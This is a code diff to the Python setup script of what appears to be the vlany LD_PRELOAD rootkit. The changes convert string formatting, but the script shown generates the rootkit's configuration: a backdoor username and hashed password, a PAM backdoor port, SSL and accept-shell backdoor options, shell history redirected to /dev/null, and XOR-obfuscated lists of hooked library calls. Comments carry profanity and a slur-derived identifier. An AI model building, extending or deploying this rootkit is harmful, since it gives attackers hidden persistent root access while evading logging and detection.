@@ -8,8 +8,8 @@ import crypt
 
 if len(sys.argv) != 16:
     print "Why are you running me from the command line?"
-    print "Usage: %0s <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>" % (sys.argv[0])
-    sys.exit()
+    print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
+    quit()
 
 MAGIC_GID = int(''.join(random.choice(string.digits[1:]) for x in range(9))) # string.digits[1:] because we don't want any zeros in the magic gid. fuck that
 
@@ -204,7 +204,7 @@ def const_h_setup():
     const_h += '#define TERM_ENV_VAR "' + xor("TERM=xterm") + '"\n'
 
     const_h += '#define VLANY_USER "' + xor(VLANY_USER) + '"\n'
-    const_h += '#define VLANY_PASSWORD "' + xor(crypt.crypt(VLANY_PASSWORD, "$6%0s" % (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(12))))) + '"\n'
+    const_h += '#define VLANY_PASSWORD "' + xor(crypt.crypt(VLANY_PASSWORD, "$6${0}".format(''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(12))))) + '"\n'
     const_h += '#define PAM_PORT ' + str(PAM_PORT) + '\n'
     const_h += '#define VLANY_PERM "' + xor("root") + '"\n'
     const_h += '#define HISTFILE "' + xor("/dev/null") + '"\n'
@@ -329,40 +329,40 @@ def const_h_setup():
     const_h += '#define MAX_LEN 4125\n'
 
     for x in CALLS:
-        const_h += "#define C%0s %1s\n" % (x.upper(), cindex(x))
+        const_h += "#define C{0} {1}\n".format(x.upper(), cindex(x))
 
     const_h += '#define _CSIZE ' + str(len(CALLS))
     CALL_LIST = '\nstatic char *calls[_CSIZE] = {'
     for x in CALLS:
-        CALL_LIST += '"%0s",' % (xor(x))
+        CALL_LIST += '"{0}",'.format(xor(x))
     CALL_LIST = CALL_LIST[:-1] + "};\n"
     const_h += CALL_LIST
 
     const_h += '#define LIBC_SIZE ' + str(len(LIBC_CALLS))
     LIBC_CALL_LIST = '\nstatic char *libc_calls[LIBC_SIZE] = {'
     for x in LIBC_CALLS:
-        LIBC_CALL_LIST += '"%0s",' % (xor(x))
+        LIBC_CALL_LIST += '"{0}",'.format(xor(x))
     LIBC_CALL_LIST = LIBC_CALL_LIST[:-1] + "};\n"
     const_h += LIBC_CALL_LIST
 
     const_h += '#define LIBDL_SIZE ' + str(len(LIBDL_CALLS))
     LIBDL_CALL_LIST = '\nstatic char *libdl_calls[LIBDL_SIZE] = {'
     for x in LIBDL_CALLS:
-        LIBDL_CALL_LIST += '"%0s",' % (xor(x))
+        LIBDL_CALL_LIST += '"{0}",'.format(xor(x))
     LIBDL_CALL_LIST = LIBDL_CALL_LIST[:-1] + "};\n"
     const_h += LIBDL_CALL_LIST
 
     const_h += '#define LIBPAM_SIZE ' + str(len(LIBPAM_CALLS))
     LIBPAM_CALL_LIST = '\nstatic char *libpam_calls[LIBPAM_SIZE] = {'
     for x in LIBPAM_CALLS:
-        LIBPAM_CALL_LIST += '"%0s",' % (xor(x))
+        LIBPAM_CALL_LIST += '"{0}",'.format(xor(x))
     LIBPAM_CALL_LIST = LIBPAM_CALL_LIST[:-1] + "};\n"
     const_h += LIBPAM_CALL_LIST
 
     const_h += '#define GPSIZE ' + str(len(GAY_PROCS))
     GAY_PROCS_LIST = '\nstatic char *gay_procs_list[GPSIZE] = {'
     for x in GAY_PROCS:
-        GAY_PROCS_LIST += '"%0s",' % (xor(x))
+        GAY_PROCS_LIST += '"{0}",'.format(xor(x))
     GAY_PROCS_LIST = GAY_PROCS_LIST[:-1] + "};\n"
     const_h += GAY_PROCS_LIST
 
